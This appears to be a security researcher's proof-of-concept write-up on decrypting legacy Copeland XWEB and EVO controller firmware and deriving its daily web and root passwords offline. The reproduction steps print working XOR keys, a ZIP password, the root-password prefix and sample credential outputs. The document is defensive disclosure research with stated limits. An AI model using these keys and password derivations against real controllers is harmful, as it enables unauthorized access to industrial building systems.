# PoC: Offline XWEB2009/EVO firmware and password recovery

- Related analysis reports: `analysis/XWEB2009_4.0.19.md`, `analysis/XWEB-EVO-5.2.3.md`
- Related CVE (if any): new, unreported; no CVE assignment claimed
- Product / version: legacy XWEB2009 3.2–4.0.x, XWEB500 2011, XWEB EVO 5.2.3 and 5.8.8
- Status: verified

## Summary

Official Copeland packages provide enough plaintext and known-plaintext material
to recover legacy and EVO firmware, the ARM update chain, and the daily-password
algorithm. This demonstrates offline access to genuine code and update logic.
It does not demonstrate decryption of XWEB Pro or E3/SS.

## Constraints

- Static/offline demonstration and local QEMU execution only.
- No internet-facing testing and no interaction with live devices.
- Do not use recovered credentials against production or third-party systems.
- XWEB Pro and E3/SS are outside the successful result described here.

## Evidence

- `tools/xweb2009_xor_extract.py`: 23 valid RPMs; one unresolved Russian variant.
- `extracted/XWEB2009_upload-4.0.19/preinstallf9.decrypted.sh`: complete update preparation script.
- `extracted/XWEB3000V32_components/`: original `xjpasswd` and `xjsyswrap`.
- `tools/xweb_evo_password.py`: independent daily-password implementation with eight binary-matched date vectors and a supplied-MAC vector.
- `extracted/XWEB_EVO_5.2.3_ARM/EVOPackage-5.2.3.STANDARD.5-bbfd5b.epkg.decrypted`: valid shell installer and gzip cpio.
- `extracted/XWEB_EVO_5.2.3_ARM_package/opt/xweb/bin/tools/new_install_epkg.sh`: genuine ARM updater.
- `extracted/XWEB_EVO_5.8.8_ARM/EVOPackage-5.8.8.decrypted-v2`: valid 2024 shell installer and 18,534,400-byte cpio.
- `extracted/XWEB500_DIN_update_2011/script.sh.decrypted`: 2011 ARM update script; kernel and filesystem also recovered.
- `results/xweb-evo-derived-probe.json`: 448 Pro transfer operations, zero hits.
- `results/xweb-evo58-secret-probe.json`: 364 Pro candidate operations, zero hits.

## Reproduction steps

1. Verify official inputs:

   ```bash
   sha256sum -c firmware/SHA256SUMS
   ```

2. Recover the legacy RPM chain:

   ```bash
   python3 tools/xweb2009_xor_extract.py \
     firmware/related/XWEB2009_upload-update-4.0.19.zip \
     extracted/XWEB2009_upload-4.0.19
   ```

   Expected: 23 valid RPMs and one skipped Russian variant. The 4.0.19 output
   is byte-identical to Copeland's USB plaintext RPM.

3. Recover the EVO x86 package and XML descriptors:

   ```bash
   python3 tools/xweb_evo_xor_extract.py \
     firmware/related/XWEB_EVO_5.2.3.STANDARD.5-bbfd5b_3000_5000.zip \
     extracted/XWEB_EVO_5.2.3_3000_5000
   ```

4. Validate the daily-password implementation:

   ```bash
   python3 tools/xweb_evo_password.py --self-test
   python3 tools/xweb_evo_password.py 26 10 2026 --mac 00:11:22:33:44:55
   ```

   Expected supplied-MAC output: `J0ARL6`. The eight self-test vectors match
   the genuine binary under qemu-i386. The recovered `etc/cron.daily/chp` adds
   `xwebdix` to form the Unix root password; reproduce that separate form with:

   ```bash
   python3 tools/xweb_evo_password.py 26 10 2026 --root-password
   ```

   Expected offline output: `xwebdixC1BOF0`. The web `Administrator` path uses
   the unprefixed daily code. Neither form is guaranteed to match every device.

5. Recover the ARM 5.2.3 package using the EVO RPM key:

   ```python
   from pathlib import Path
   key = bytes.fromhex(
       'e4 f7 ee f1 c0 c2 ca c0 c6 c4 8c 94 8f 93 8f 92 8f f2 f5 e0'
   )
   source = Path('extracted/XWEB_EVO_5.2.3_ARM/EVOPackage-5.2.3.STANDARD.5-bbfd5b.epkg')
   ciphertext = source.read_bytes()
   plaintext = bytes(value ^ key[index % 20] for index, value in enumerate(ciphertext))
   assert plaintext.startswith(b'#!/bin/sh\n\n')
   Path(str(source) + '.decrypted').write_bytes(plaintext)
   ```

   The embedded gzip payload expands to a cpio containing `installer` and
   `update.evo`. The SquashFS/tar layers provide `updater.sh`,
   `new_install_epkg.sh`, and `new_xwrpm.cgi`.

6. Recover the 5.8.8 package using the variant with key positions 13 and 14 set
   to `0x99`:

   ```text
   e4 f7 ee f1 c0 c2 ca c0 c6 c4 8c 94 8f 99 8f 99 8f f2 f5 e0
   ```

   Expected: valid shell text and an 18,534,400-byte gzip cpio.

7. For the 2011 XWEB500 archive, use ZIP password `dixell`, then XOR the
   `script.sh`, `fs-scrambled`, and `kernel-scrambled` files with `0xa7`.
   Expected: shell text, a 161,105,920-byte filesystem cpio, and a valid ARM
   u-boot kernel image.

## Impact

Legacy and EOL/EVO package obfuscation does not protect firmware
confidentiality. Public packages permit offline reverse engineering of
authentication and update logic. Predictable date/MAC passwords should not be
treated as strong secrets. These results do not establish a current XWEB Pro or
E3/SS exploit and do not show that any production system was compromised.

## Mitigation / vendor fix

Keep controllers off the Internet, isolate legacy/EVO devices, update supported
products, replace default credentials, and monitor administrative/update
activity. Coordinate any new findings with Copeland product security before
external publication; see `submission/DISCLOSURE-STATUS.md`.
